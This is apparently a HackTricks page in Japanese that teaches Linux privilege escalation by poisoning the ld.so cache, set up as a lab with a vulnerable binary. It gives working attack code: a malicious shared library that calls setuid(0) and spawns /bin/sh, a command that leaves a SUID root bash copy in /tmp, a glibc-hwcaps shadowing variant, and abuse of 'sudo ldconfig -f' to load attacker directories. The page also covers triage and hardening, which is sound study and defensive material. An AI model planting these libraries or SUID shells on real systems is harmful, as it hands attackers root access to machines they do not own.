# ld.so privesc exploit 例

{{#include ../../banners/hacktricks-training.md}}

このページでは、**`/etc/ld.so.conf` または `ldconfig` を介して system linker cache を poison する**ための lab に焦点を当てます。missing-library injection、writable `RPATH`/`RUNPATH`、`LD_PRELOAD`、その他の generic SUID linker abuse については、[SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) を参照してください。

## 環境の準備

以下のセクションでは、環境の準備に使用するファイルの code を確認できます。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **作成**: 同じフォルダー内にこれらのファイルをマシン上で作成します
2. **コンパイル**: **ライブラリ**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` を `/usr/lib` に**コピー**し、cache を更新します: `sudo cp libcustom.so /usr/lib && sudo ldconfig`（root privs）
4. **コンパイル**: **実行ファイル**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 環境を確認する

_libcustom.so_ が _/usr/lib_ から**ロード**されており、binary を**実行**できることを確認します。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Useful triage commands

実際の target を攻撃する際は、binary が必要とする **正確な library 名**、loader が**現在解決している対象**、および稼働中の cache を変更せずに書き込み可能な設定済み path を確認します。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` は**信頼できる**実行ファイルに対してのみ使用してください。実装によっては、または通常とは異なる ELF interpreter によっては、攻撃者が制御する code を実行する可能性があります。`objdump -p ./file | grep NEEDED` を使えば、直接の依存関係を安全に一覧表示できます。信頼できる target では、特定した interpreter を `--list` とともに呼び出すことで、実際の解決結果を確認できます。<sup>[[4]](#references)</sup>

いくつかの注意点:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` は通常**機能しません**。リダイレクトは現在の shell によって実行されるためです。代わりに
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` を使用してください。
- **SUID/privileged** binary は **secure-execution mode** で実行されます。`LD_LIBRARY_PATH`
は無視され、`LD_PRELOAD` には制限があります（slash を含む名前は無視され、標準 directory にある setuid-marked library のみ preload できます）。root が `ldconfig` を実行すると、`/etc/ld.so.conf` に記載された directory が `/etc/ld.so.cache` に入る可能性があるため、この misconfiguration は依然として privileged program に影響を与えることがあります。<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` も、`/etc/suid-debug` が存在しない限り secure-execution mode では無視されます。そのため、privileged execution からの出力を期待するのではなく、同等の non-SUID run から trace を収集してください。<sup>[[1]](#references)</sup>
- glibc 2.33 以降では、dynamic loader が `--list-diagnostics` も提供しています。hijack が期待どおりに動作しない場合に、machine-readable な loader diagnostics と組み込みの search-path 情報を出力できます。<sup>[[1]](#references)[[6]](#references)</sup>

### Cache と SONAME の制約

`ldconfig` は、configured directory 内にある任意の file をすべて cache するわけではありません。ELF header を調べ、`lib*.so*` または `ld-*.so*` に一致する名前を認識し、通常の `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain を想定します。したがって、injected object には target の architecture/class、正確な `DT_NEEDED` name（通常はその `DT_SONAME`）、および victim が解決するすべての symbol/version が必要です。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefer a target-specific library such as this example. 不完全な object で一般的な SONAME を Shadowing すると、意図した privileged target の実行前にそのライブラリを解決するすべての process が破損する可能性があります。<sup>[[3]](#references)</sup>

## Exploit

このシナリオでは、管理者がシステムの
`/etc/ld.so.conf` によって読み込まれる
`/etc/ld.so.conf.d/` 配下のファイルに、脆弱なエントリを追加したとします。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダは _/home/ubuntu/lib_ です（ここでは書き込みアクセス権があります）。\
そのパス内で次のコードを**ダウンロードしてコンパイル**します：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
後で **root**（または別の特権アカウント）が脆弱なバイナリを実行すると予想される場合は、通常、interactive shell を起動するよりも **root-owned artifact** を残しておく方が適切です。例えば：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
その後、privileged execution が実行されたら、`/tmp/rootbash -p` を使用できます。

**misconfigured** なパス内に悪意のある libcustom library を**作成した**ので、default cache は、成功した privileged **`ldconfig`** の実行によって再構築される必要があります。reboot は、ローカルの boot process が実際にこれを呼び出す場合にのみ役立ちます。それ以外の場合は、administrator の操作を待つか、利用可能であれば unsafe sudo rule を使用してください。<sup>[[2]](#references)</sup>

これが発生したら、`sharedvuln` executable が `libcustom.so` library をどこから読み込んでいるかを**再確認**します：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、これは **`/home/ubuntu/lib` からロード**され、任意のユーザーが実行すると shell が実行されます:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> この例ではまだ privileges を escalate していない点に注意してください。しかし、実行される commands を変更し、**root またはその他の privileged user が vulnerable binary を実行するのを待つ**ことで、privileges を escalate できます。

### 最新の `glibc-hwcaps` shadowing

glibc 2.33 以降、loader は**すべての library search directory** 内にある `glibc-hwcaps/<level>/` 配下の optimized libraries を優先できます。そのため、`/home/ubuntu/lib` だけを確認するのは不十分です。`/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` のような writable な compatible subdirectory は、`ldconfig` がインデックス化した後に base library を shadow できます。一方、その他の CPU では base object が引き続き使用されます。これにより、別の CPU 上で validation を行った場合に見逃される可能性がある、architecture-selective な hijack も可能になります。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
現在の glibc hardening guidance では、重複する SONAME、デフォルト以外の search location、および `glibc-hwcaps` サブディレクトリ内のオブジェクトを避けることが推奨されています。Audit の観点では、設定されたディレクトリと、その親パスコンポーネントに対して、所有権および writeability のチェックを再帰的に適用してください。<sup>[[3]](#references)</sup>

### その他の misconfiguration - 同じ vuln

前の例では、管理者が **`/etc/ld.so.conf.d/` 内の configuration file に非特権フォルダーを設定した**という misconfiguration を偽装しました。\
しかし、同じ vulnerability を引き起こす可能性のある misconfiguration は他にもあります。ロードされる **config file** に対する **write permissions** を持っている場合、書き込み可能な `/etc/ld.so.conf.d/` ディレクトリ内にファイルを作成できる場合、または `/etc/ld.so.conf` に書き込める場合、同じ vulnerability を設定して exploit できます。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig` に対する sudo privileges があるとします**。\
`-f` を使用して、**どの configuration file を読み取るかを `ldconfig` に指定できます**。そのため、attacker-controlled directories を指定するファイルによって、`ldconfig` にそれらのフォルダーを cache に追加させることができます。<sup>[[2]](#references)</sup>\
それでは、`"/tmp"` をロードするために必要なファイルとフォルダーを作成しましょう：
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
ここで、**previous exploit**で示したように、**malicious libraryを`/tmp`内に作成**します。\
最後に、pathを読み込んで、binaryがどこからlibraryを読み込んでいるか確認します:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig` に対する sudo 権限があれば、同じ脆弱性を悪用できます。** 制限された sudo ルールを評価する際は、オプションの詳細が重要です。`-f` は別の設定ファイルを選択しますが、それでも `/etc/ld.so.cache` を再構築します。`-C` は cache の出力先を別の場所に変更します。`-N` は cache の再構築を防ぎます。`-X` は link の更新を防ぎますが、**`-N` と組み合わせない限り cache は再構築します**。<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux マニュアルページ](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
